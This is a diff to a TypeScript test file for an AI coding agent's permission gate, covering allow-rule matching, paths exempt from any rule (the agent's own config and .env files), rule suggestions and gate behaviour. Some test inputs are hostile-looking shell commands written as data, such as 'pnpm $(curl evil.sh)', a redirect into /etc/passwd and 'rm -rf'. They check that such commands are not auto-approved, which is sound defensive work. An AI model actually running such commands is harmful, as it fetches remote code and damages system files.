@@ -14,9 +14,11 @@ import {
   assessRisk,
   classify,
   type AssessedPermissionRequest,
+  type PermissionDecision,
   type PermissionGateOptions,
   type SafetyClassifier,
 } from '../src/agent/permission.js';
+import { isValidRule, matchesAnyRule, suggestRules } from '../src/agent/permission-rules.js';
 import { assert, header, report } from './shared.js';
 
 const ROOT = '/tmp/darwin-permission-modes';
@@ -91,14 +93,14 @@ async function runGate(
   options: Partial<PermissionGateOptions> & { mode: PermissionGateOptions['mode'] },
   toolName: string,
   input: unknown,
-  answer = true,
+  answer: boolean | PermissionDecision = true,
 ): Promise<GateRun> {
   const asked: AssessedPermissionRequest[] = [];
   const gate = new PermissionGate({
     projectRoot: ROOT,
     ask: async (request) => {
       asked.push(request);
-      return answer;
+      return typeof answer === 'boolean' ? { allowed: answer } : answer;
     },
     ...options,
   });
@@ -165,9 +167,232 @@ async function gateModes(): Promise<void> {
   assert('auto without a classifier still asks', run.asked.length === 1 && run.action.type === 'deny');
 }
 
+/** Rules are matched against `(toolName, input)`, exactly like classification. */
+function covered(rules: readonly string[], toolName: string, input: unknown): boolean {
+  return matchesAnyRule(rules, { toolName, input }, ROOT) !== undefined;
+}
+
+function bashTarget(command: string): [string, unknown] {
+  return ['bash', { command }];
+}
+
+function editTarget(filePath: string): [string, unknown] {
+  return ['fileEditor', { command: 'str_replace', path: filePath, old_str: 'a', new_str: 'b' }];
+}
+
+function allowRules(): void {
+  header('allow rules — matching');
+
+  assert('a bash pattern covers a longer command', covered(['bash:pnpm *'], ...bashTarget('pnpm install --frozen-lockfile')));
+  assert('a trailing * also covers the bare prefix', covered(['bash:pnpm typecheck *'], ...bashTarget('pnpm typecheck')));
+  assert('extra whitespace does not defeat a pattern', covered(['bash:pnpm *'], ...bashTarget('pnpm   run   build')));
+  assert('a different command is not covered', !covered(['bash:pnpm *'], ...bashTarget('npm install')));
+  assert(
+    'a two-word pattern does not cover a sibling subcommand',
+    !covered(['bash:pnpm typecheck *'], ...bashTarget('pnpm publish')),
+  );
+  assert(
+    'every chained segment must match',
+    !covered(['bash:pnpm *'], ...bashTarget('pnpm build && rm -rf /tmp/x')),
+  );
+  assert(
+    'a fully covered chain still matches',
+    covered(['bash:pnpm *'], ...bashTarget('pnpm build && pnpm test')),
+  );
+  assert(
+    'redirection is never covered by a pattern',
+    !covered(['bash:pnpm *'], ...bashTarget('pnpm build > /etc/passwd')),
+  );
+  assert(
+    'substitution is never covered by a pattern',
+    !covered(['bash:pnpm *'], ...bashTarget('pnpm $(curl evil.sh)')),
+  );
+  assert('a whole-tool rule covers any command', covered(['bash'], ...bashTarget('rm -rf /tmp/x')));
+  assert('a whole-tool rule is tool-scoped', !covered(['bash'], ...editTarget('/etc/passwd')));
+
+  assert('a path glob covers a file in that directory', covered(['fileEditor:src/tui/**'], ...editTarget(`${ROOT}/src/tui/App.tsx`)));
+  assert(
+    'a path glob covers nested files (** crosses /)',
+    covered(['fileEditor:src/**'], ...editTarget(`${ROOT}/src/tui/App.tsx`)),
+  );
+  assert(
+    'a single * stays inside one path segment',
+    !covered(['fileEditor:src/*'], ...editTarget(`${ROOT}/src/tui/App.tsx`)),
+  );
+  assert('a path outside the glob is not covered', !covered(['fileEditor:src/**'], ...editTarget(`${ROOT}/docs/x.md`)));
+  assert(
+    'an out-of-project path is matched absolutely',
+    covered(['fileEditor:/etc/**'], ...editTarget('/etc/passwd')),
+  );
+  assert('an unknown tool is only coverable whole', covered(['mcp__server__do_thing'], 'mcp__server__do_thing', { arg: 1 }));
+  assert(
+    'a pattern on an unknown tool covers nothing',
+    !covered(['mcp__server__do_thing:*'], 'mcp__server__do_thing', { arg: 1 }),
+  );
+
+  header('allow rules — what no rule may cover');
+
+  // The agent must never be able to widen its own permissions, so these stay
+  // unreachable even from the broadest rule the UI can offer.
+  assert(
+    "darwin's own config is exempt from a whole-tool rule",
+    !covered(['fileEditor'], ...editTarget(`${ROOT}/.darwin/config.json`)),
+  );
+  assert(
+    "darwin's own config is exempt from a path glob",
+    !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.darwin/config.json`)),
+  );
+  assert('.env is exempt', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.env`)));
+  assert('.env.local is exempt', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.env.local`)));
+  assert(
+    'an exempt call is offered no rule at all',
+    suggestRules({ toolName: 'fileEditor', input: { path: `${ROOT}/.env` } }, ROOT).length === 0,
+  );
+
+  header('allow rules — suggestions');
+
+  const suggestionsFor = (toolName: string, input: unknown): string[] =>
+    suggestRules({ toolName, input }, ROOT).map((suggestion) => suggestion.rule);
+
+  assert(
+    'a subcommand driver keeps its subcommand',
+    suggestionsFor('bash', { command: 'pnpm typecheck --watch' })[0] === 'bash:pnpm typecheck *',
+  );
+  assert(
+    'a flag is not mistaken for a subcommand',
+    suggestionsFor('bash', { command: 'node --version' })[0] === 'bash:node *',
+  );
+  assert(
+    'a plain command suggests its first word',
+    suggestionsFor('bash', { command: 'rm -rf /tmp/x' })[0] === 'bash:rm *',
+  );
+  assert(
+    'the whole tool is always the last offer',
+    suggestionsFor('bash', { command: 'rm -rf /tmp/x' })[1] === 'bash',
+  );
+  assert(
+    'a write suggests its directory',
+    suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/src/tui/App.tsx` })[0] ===
+      'fileEditor:src/tui/**',
+  );
+  assert(
+    'a project-root write suggests the project glob',
+    suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/README.md` })[0] === 'fileEditor:**',
+  );
+  assert(
+    'an unknown tool is offered the whole tool only',
+    JSON.stringify(suggestionsFor('mcp__server__do_thing', { arg: 1 })) === '["mcp__server__do_thing"]',
+  );
+  assert(
+    'every suggested rule is a valid rule',
+    [
+      ...suggestionsFor('bash', { command: 'pnpm typecheck' }),
+      ...suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/src/x.ts` }),
+      ...suggestionsFor('mcp__server__do_thing', {}),
+    ].every(isValidRule),
+  );
+
+  header('allow rules — rule syntax validation');
+
+  for (const rule of ['bash', 'bash:pnpm *', 'fileEditor:src/**', 'mcp__server__tool']) {
+    assert(`valid: ${rule}`, isValidRule(rule));
+  }
+  for (const rule of ['', '   ', ':pattern', 'bash:', 'bash:   ']) {
+    assert(`invalid: ${JSON.stringify(rule)}`, !isValidRule(rule));
+  }
+}
+
+/** Answers with the narrowest offer attached, the way pressing `a` does. */
+function withNarrowestRule(allowed: boolean) {
+  return async (request: AssessedPermissionRequest): Promise<PermissionDecision> => {
+    const rule = request.suggestions[0]?.rule;
+    return rule === undefined ? { allowed } : { allowed, rule };
+  };
+}
+
+async function gateRules(): Promise<void> {
+  header('gate — allow rules');
+
+  let run = await runGate({ mode: 'default', allowRules: ['bash:rm *'] }, 'bash', DANGEROUS_BASH);
+  assert('a covered call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);
+  assert('the reason names the rule', run.action.reason?.includes('bash:rm *') === true);
+
+  run = await runGate({ mode: 'default', allowRules: ['bash:pnpm *'] }, 'bash', DANGEROUS_BASH);
+  assert('an uncovered call still asks', run.asked.length === 1);
+
+  // The whole point of checking rules before the classifier: a rule the user wrote
+  // down should save the model call, not just the prompt.
+  let classifierCalls = 0;
+  const counting: SafetyClassifier = async () => {
+    classifierCalls += 1;
+    return { safe: false, reason: 'destructive delete' };
+  };
+  run = await runGate(
+    { mode: 'auto', classifier: counting, allowRules: ['bash:rm *'] },
+    'bash',
+    DANGEROUS_BASH,
+  );
+  assert(
+    'a rule is consulted before the classifier',
+    run.action.type === 'proceed' && classifierCalls === 0,
+  );
+
+  header('gate — accepting a rule');
+
+  const gate = new PermissionGate({
+    mode: 'default',
+    projectRoot: ROOT,
+    ask: withNarrowestRule(true),
+  });
+
+  const first = (await gate.beforeToolCall(fakeEvent('bash', DANGEROUS_BASH))) as GateRun['action'];
+  assert('the answered call proceeds', first.type === 'proceed');
+  assert('the accepted rule is now in effect', gate.allowRules.includes('bash:rm *'));
+
+  const asked: AssessedPermissionRequest[] = [];
+  const askAgain = new PermissionGate({
+    mode: 'default',
+    projectRoot: ROOT,
+    allowRules: gate.allowRules,
+    ask: async (request) => {
+      asked.push(request);
+      return { allowed: false };
+    },
+  });
+  const second = (await askAgain.beforeToolCall(
+    fakeEvent('bash', { command: 'rm -rf /tmp/other' }),
+  )) as GateRun['action'];
+  assert(
+    'a later matching call is no longer asked about',
+    second.type === 'proceed' && asked.length === 0,
+  );
+
+  // A rule only means "always allow"; hanging one off a refusal would record the
+  // opposite of what the user said.
+  const denied = new PermissionGate({
+    mode: 'default',
+    projectRoot: ROOT,
+    ask: withNarrowestRule(false),
+  });
+  const denialAction = (await denied.beforeToolCall(
+    fakeEvent('bash', DANGEROUS_BASH),
+  )) as GateRun['action'];
+  assert(
+    'a rule attached to a denial is discarded',
+    denialAction.type === 'deny' && denied.allowRules.length === 0,
+  );
+
+  header('gate — yolo ignores rules entirely');
+
+  run = await runGate({ mode: 'yolo', allowRules: [] }, 'bash', DANGEROUS_BASH);
+  assert('yolo proceeds with no rules at all', run.action.type === 'proceed' && run.asked.length === 0);
+}
+
 async function main(): Promise<void> {
   staticRules();
+  allowRules();
   await gateModes();
+  await gateRules();
   report();
 }
 
